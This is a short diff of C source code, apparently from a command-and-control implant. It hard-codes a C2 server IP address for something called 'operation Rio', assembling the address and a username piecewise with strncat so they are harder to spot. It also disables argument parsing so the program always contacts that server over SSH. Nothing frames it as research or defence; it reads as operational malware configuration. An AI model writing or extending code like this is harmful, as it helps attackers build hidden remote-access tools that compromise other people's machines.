@@ -168,14 +168,14 @@ int main(int argc, char** argv){
     strncat(username, "ous", 100);
     
     //We need the new IP
-    //Static IP for operation Rio
-    //strncat(C2_host, "34.", 100); 
-    //strncat(C2_host, "73.", 100);
-    //strncat(C2_host, "176.", 100);
-    //strncat(C2_host, "246", 100);
+    //Static IP for operation Rio 35.237.100.68
+    strncat(C2_host, "35.", 100); 
+    strncat(C2_host, "237.", 100);
+    strncat(C2_host, "100.", 100);
+    strncat(C2_host, "68", 100);
 
     //Then we need to comment this:
-    parse_args(argc, argv, C2_host, username);
+    //parse_args(argc, argv, C2_host, username);
 
     ssh_init(); // libssh mandatory
 
